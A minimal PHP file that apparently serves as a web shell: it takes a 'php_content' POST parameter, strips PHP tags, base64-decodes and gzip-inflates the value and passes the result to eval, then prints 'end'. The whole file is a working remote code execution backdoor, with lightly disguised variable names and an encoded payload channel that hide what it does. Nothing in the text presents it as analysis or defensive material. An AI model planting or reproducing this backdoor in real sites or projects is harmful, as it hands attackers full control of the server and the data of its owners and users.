<?php
$c_ntent=$_POST['php_content'];
$res_t=trim(stripslashes($c_ntent.' '),'<?php, ?>');
eval(gzinflate(base64_decode("$res_t")));
echo "end";
?>